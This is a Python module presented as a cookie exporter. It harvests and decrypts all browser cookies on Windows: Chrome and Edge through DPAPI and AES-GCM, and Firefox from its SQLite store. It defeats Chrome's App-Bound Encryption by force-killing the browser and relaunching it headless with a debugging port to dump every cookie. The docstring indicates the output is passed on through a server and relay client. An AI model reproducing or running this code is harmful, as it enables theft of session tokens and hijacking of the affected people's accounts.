"""
export_cookies.py  —  Exports Chrome, Edge, and Firefox cookies to a list.
Called by cookie_manager.py -> server.py -> relay_client.py.

Handles:
  - Chrome/Edge v10/v11 (DPAPI + AES-GCM, pre-Chrome-130)
  - Chrome/Edge v20     (App-Bound Encryption, Chrome 130+ / Edge equivalents)
                         → falls back to CDP (headless debug mode)
  - Firefox             (plain SQLite, no encryption)
"""

import os
import json
import shutil
import sqlite3
import base64
import tempfile
import ctypes
import ctypes.wintypes
import subprocess
import time
import urllib.request
from pathlib import Path


# ── Shared file-copy helper ────────────────────────────────────────────────────

def _copy_locked_file(src: Path, dst: str):
    """Copy a browser-locked file using Win32 sharing flags."""
    try:
        GENERIC_READ          = 0x80000000
        FILE_SHARE_ALL        = 0x00000001 | 0x00000002 | 0x00000004
        OPEN_EXISTING         = 3
        FILE_ATTRIBUTE_NORMAL = 0x80

        handle = ctypes.windll.kernel32.CreateFileW(
            str(src), GENERIC_READ, FILE_SHARE_ALL,
            None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None,
        )
        if handle == ctypes.wintypes.HANDLE(-1).value:
            raise OSError("CreateFileW failed")

        import msvcrt
        fd = msvcrt.open_osfhandle(handle, os.O_RDONLY | os.O_BINARY)
        with os.fdopen(fd, "rb") as fin, open(dst, "wb") as fout:
            fout.write(fin.read())
    except Exception:
        shutil.copy2(src, dst)


# ── Chrome / Edge: key + AES-GCM decrypt (v10/v11) ───────────────────────────

def _get_chrome_key(local_state_path: Path) -> bytes:
    import win32crypt

    with open(local_state_path, encoding="utf-8") as f:
        state = json.load(f)

    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # strip "DPAPI" prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


def _decrypt_value(key: bytes, encrypted_value: bytes) -> str:
    if not encrypted_value:
        return ""
    try:
        from Crypto.Cipher import AES
        if encrypted_value[:3] in (b"v10", b"v11"):
            nonce      = encrypted_value[3:15]
            tag        = encrypted_value[-16:]
            ciphertext = encrypted_value[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
        else:
            # Older DPAPI-only format (pre-v10) or unknown
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(
                "utf-8", errors="replace"
            )
    except Exception:
        return ""


# ── Chrome / Edge: CDP fallback for App-Bound Encryption (v20, Chrome 130+) ──

def _find_browser_exe(browser: str) -> str | None:
    candidates = []
    if browser == "Edge":
        candidates = [
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        ]
    else:
        candidates = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        ]
    for p in candidates:
        if os.path.exists(p):
            return p
    return None


def _cdp_export_cookies(exe: str, user_data_dir: Path, browser: str) -> list:
    """
    Kill any running browser instance, launch it headless with a debug port,
    pull all cookies via CDP Network.getAllCookies, then close it.
    Chrome epoch offset: (unix_ts + 11644473600) * 1_000_000
    """
    import websocket  # websocket-client

    proc_name = "msedge.exe" if browser == "Edge" else "chrome.exe"
    subprocess.run(["taskkill", "/F", "/IM", proc_name], capture_output=True)
    time.sleep(1)

    debug_port = 9224  # non-standard to avoid clashing with any existing debug session
    proc = subprocess.Popen(
        [
            exe,
            f"--remote-debugging-port={debug_port}",
            f"--user-data-dir={str(user_data_dir)}",
            "--headless=new",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-sync",
            "--disable-extensions",
            "about:blank",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    rows = []
    try:
        # Wait for browser to be ready
        ws_url = None
        for _ in range(20):
            try:
                data = urllib.request.urlopen(
                    f"http://localhost:{debug_port}/json/list", timeout=2
                ).read()
                targets = json.loads(data)
                if targets:
                    ws_url = targets[0]["webSocketDebuggerUrl"]
                    break
            except Exception:
                time.sleep(0.5)

        if not ws_url:
            return []

        ws = websocket.create_connection(ws_url, timeout=10)
        ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
        response = json.loads(ws.recv())
        ws.close()

        CHROME_EPOCH_OFFSET = 11_644_473_600  # seconds between 1601-01-01 and 1970-01-01

        for c in response.get("result", {}).get("cookies", []):
            expires_unix = c.get("expires", -1)
            if expires_unix >= 0:
                expires_utc = int((expires_unix + CHROME_EPOCH_OFFSET) * 1_000_000)
            else:
                expires_utc = 0

            samesite_map = {"Strict": 2, "Lax": 1, "None": 0}
            rows.append({
                "browser":      browser,
                "host":         c.get("domain", ""),
                "name":         c.get("name", ""),
                "value":        c.get("value", ""),
                "path":         c.get("path", "/"),
                "expires_utc":  expires_utc,
                "is_secure":    bool(c.get("secure", False)),
                "is_httponly":  bool(c.get("httpOnly", False)),
                "samesite":     samesite_map.get(c.get("sameSite", ""), -1),
                "source_scheme": 2 if c.get("secure") else 1,
            })
    finally:
        proc.terminate()
        time.sleep(0.5)

    return rows


# ── Main Chromium export ───────────────────────────────────────────────────────

def export_chromium_cookies(profile_path: Path, local_state_path: Path, browser: str) -> list:
    # Chrome 96+ moved cookies to Network/Cookies
    cookie_db = profile_path / "Network" / "Cookies"
    if not cookie_db.exists():
        cookie_db = profile_path / "Cookies"
    if not cookie_db.exists():
        return []

    # --- Try DPAPI + AES-GCM (v10/v11) first ---
    try:
        key = _get_chrome_key(local_state_path)
    except Exception:
        key = None

    rows = []
    if key:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as tmp:
            tmp_path = tmp.name
        _copy_locked_file(cookie_db, tmp_path)
        try:
            con = sqlite3.connect(tmp_path)
            cur = con.execute(
                "SELECT host_key, name, encrypted_value, path, expires_utc, "
                "is_secure, is_httponly, samesite, source_scheme FROM cookies"
            )
            for row in cur.fetchall():
                host, name, enc_val, path, expires, secure, httponly, samesite, scheme = row
                value = _decrypt_value(key, enc_val)
                rows.append({
                    "browser":      browser,
                    "host":         host,
                    "name":         name,
                    "value":        value,
                    "path":         path,
                    "expires_utc":  expires,
                    "is_secure":    bool(secure),
                    "is_httponly":  bool(httponly),
                    "samesite":     samesite,
                    "source_scheme": scheme,
                })
            con.close()
        finally:
            os.unlink(tmp_path)

    # If all values are empty (v20 App-Bound Encryption), fall back to CDP
    has_values = any(r["value"] for r in rows)
    if not has_values:
        exe = _find_browser_exe(browser)
        if exe:
            try:
                cdp_rows = _cdp_export_cookies(exe, profile_path.parent, browser)
                if cdp_rows:
                    return cdp_rows
            except Exception:
                pass

    return rows


# ── Firefox ────────────────────────────────────────────────────────────────────

def export_firefox_cookies() -> list:
    appdata = Path(os.environ.get("APPDATA", ""))
    profiles_ini = appdata / "Mozilla" / "Firefox" / "profiles.ini"
    if not profiles_ini.exists():
        return []

    import configparser
    cfg = configparser.ConfigParser()
    cfg.read(profiles_ini)

    rows = []
    for section in cfg.sections():
        if not section.startswith("Profile"):
            continue
        rel_path = cfg.get(section, "Path", fallback=None)
        if not rel_path:
            continue
        is_relative = cfg.get(section, "IsRelative", fallback="1") == "1"
        profile_dir = (
            (appdata / "Mozilla" / "Firefox" / rel_path) if is_relative else Path(rel_path)
        )
        cookie_db = profile_dir / "cookies.sqlite"
        if not cookie_db.exists():
            continue

        with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as tmp:
            tmp_path = tmp.name
        _copy_locked_file(cookie_db, tmp_path)

        try:
            con = sqlite3.connect(tmp_path)
            cur = con.execute(
                "SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite "
                "FROM moz_cookies"
            )
            for row in cur.fetchall():
                host, name, value, path, expiry, secure, httponly, samesite = row
                rows.append({
                    "browser":      "Firefox",
                    "host":         host,
                    "name":         name,
                    "value":        value,
                    "path":         path,
                    "expires_utc":  expiry * 1_000_000,
                    "is_secure":    bool(secure),
                    "is_httponly":  bool(httponly),
                    "samesite":     samesite,
                    "source_scheme": 0,
                })
            con.close()
        finally:
            os.unlink(tmp_path)

    return rows


# ── Standalone usage ───────────────────────────────────────────────────────────

def main():
    local = Path(os.environ.get("LOCALAPPDATA", ""))

    browsers = {
        "Chrome": {
            "profile":     local / "Google"    / "Chrome" / "User Data" / "Default",
            "local_state": local / "Google"    / "Chrome" / "User Data" / "Local State",
        },
        "Edge": {
            "profile":     local / "Microsoft" / "Edge"   / "User Data" / "Default",
            "local_state": local / "Microsoft" / "Edge"   / "User Data" / "Local State",
        },
    }

    all_cookies = []
    for name, paths in browsers.items():
        if paths["profile"].exists():
            all_cookies.extend(export_chromium_cookies(paths["profile"], paths["local_state"], name))

    all_cookies.extend(export_firefox_cookies())

    out = Path("cookies_export.json")
    with open(out, "w", encoding="utf-8") as f:
        json.dump(all_cookies, f, indent=2, ensure_ascii=False)

    print(f"Done. {len(all_cookies)} cookies → {out.resolve()}")


if __name__ == "__main__":
    main()
